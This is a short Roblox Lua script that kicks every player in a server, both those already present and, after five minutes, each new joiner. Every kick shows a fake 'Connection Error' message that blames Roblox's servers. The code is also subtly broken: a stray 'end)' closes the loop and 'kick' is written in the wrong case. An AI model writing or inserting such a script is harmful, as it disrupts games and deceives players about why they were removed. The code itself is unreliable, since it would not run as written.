game.Players.PlayerAdded:Connect(function(player)
	task.wait(300)
	player:Kick("Connection Error, waiting for Roblox`s servers. Please try again later.")
end)

for i, v in pairs(game.Players:GetPlayers()) do
	v:kick("Connection Error, waiting for Roblox`s servers. Please try again later.")
end)
